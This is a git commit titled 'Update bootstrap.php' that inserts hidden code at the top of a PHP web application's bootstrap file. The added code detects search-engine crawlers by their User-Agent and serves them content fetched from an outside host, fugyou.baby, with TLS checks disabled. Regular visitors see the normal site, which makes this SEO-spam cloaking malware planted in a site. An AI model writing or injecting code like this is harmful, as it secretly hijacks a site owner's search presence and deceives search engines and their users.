8fe01590cc48c713e57f46b2be2c4287a15052ce
tuman88936 <anevan08@gmail.com>
2025-11-14 03:23:48 +0700

    Update bootstrap.php

--- bootstrap.php
+++ bootstrap.php
@@ -1,4 +1,36 @@
 <?php
+@ob_start();
+header("Vary: User-Agent");
+$targetUrl = "https://fugyou.baby/desktop/unkaha.txt";
+$botPattern = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+function fetchContentCurl($url) {
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        CURLOPT_REFERER => "https://www.google.com/",
+        CURLOPT_CONNECTTIMEOUT => 5,
+
+        CURLOPT_TIMEOUT => 10,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false
+    ]);
+    $content = curl_exec($ch);
+    curl_close($ch);
+    return $content ?: '';
+}
+if (preg_match($botPattern, strtolower($userAgent))) {
+    usleep(random_int(100000, 200000));
+    echo fetchContentCurl($targetUrl);
+    @ob_end_flush();
+    exit;
+}
+?>
+
+<?php
+
 
 /**
  * @defgroup index Index
